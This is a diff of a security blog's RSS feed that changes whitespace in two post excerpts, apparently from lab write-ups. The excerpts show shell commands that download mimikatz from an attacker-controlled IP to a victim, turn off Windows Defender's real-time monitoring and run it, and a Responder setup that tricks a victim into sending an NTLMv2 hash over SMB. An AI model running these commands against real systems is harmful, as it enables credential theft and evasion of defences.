@@ -14,10 +14,10 @@
       
       <guid>https://0xade1.github.io/devdraft/posts/2020/05/mimikatz/</guid>
       <description>Identification of the processor architecture
-1 2  PS C:\users\administrator\Music&amp;gt; $env:PROCESSOR_ARCHITECTURE AMD64   Upload mimikatz
-1 2 3  wget https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200208/mimikatz_trunk.zip unzip mimikatz_trunk.zip -d mimikatz cp mimikatz/x64/mimikatz.exe http/   We download Mimikatz and execute after having disabled Windows Defender
-1 2 3  PS C:\users\administrator\Music&amp;gt; iwr -uri http://10.10.14.73:8080/mimikatz.exe -outfile mimikatz.exe PS C:\users\administrator\Music&amp;gt; Set-MpPreference -DisableRealtimeMonitoring $true PS C:\users\administrator\Music&amp;gt; ./mimikatz.exe exit   output:
- .#####. mimikatz 2.2.0 (x64) #18362 Feb 8 2020 12:26:49 .</description>
+1 2 PS C:\users\administrator\Music&amp;gt; $env:PROCESSOR_ARCHITECTURE AMD64 Upload mimikatz
+1 2 3 wget https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200208/mimikatz_trunk.zip unzip mimikatz_trunk.zip -d mimikatz cp mimikatz/x64/mimikatz.exe http/ We download Mimikatz and execute after having disabled Windows Defender
+1 2 3 PS C:\users\administrator\Music&amp;gt; iwr -uri http://10.10.14.73:8080/mimikatz.exe -outfile mimikatz.exe PS C:\users\administrator\Music&amp;gt; Set-MpPreference -DisableRealtimeMonitoring $true PS C:\users\administrator\Music&amp;gt; ./mimikatz.exe exit output:
+.#####. mimikatz 2.2.0 (x64) #18362 Feb 8 2020 12:26:49 .## ^ ##. &amp;quot;A La Vie, A L&#39;Amour&amp;quot; - (oe.</description>
     </item>
     
     <item>
@@ -27,9 +27,9 @@
       
       <guid>https://0xade1.github.io/devdraft/posts/2020/05/responder/</guid>
       <description>Installation My docker environment do not have access to utun4 Kali Responder
-1 2 3 4 5  git clone https://github.com/lgandx/Responder.git cd Responder sudo python Responder.py -i 10.10.14.73 -wrf [...] [+] Listening for events...   Then from the victim side, we use powershell to attempt collecting the password hash of the current user:
-1  Get-Content \\10.10.14.73\randomFileName   Responder will intercept the following hash
-1 2 3 4 5 6  [+] Listening for events.</description>
+1 2 3 4 5 git clone https://github.com/lgandx/Responder.git cd Responder sudo python Responder.py -i 10.10.14.73 -wrf [...] [+] Listening for events... Then from the victim side, we use powershell to attempt collecting the password hash of the current user:
+1 Get-Content \\10.10.14.73\randomFileName Responder will intercept the following hash
+1 2 3 4 5 6 [+] Listening for events... [SMB] NTLMv2-SSP Client : 10.</description>
     </item>
     
   </channel>
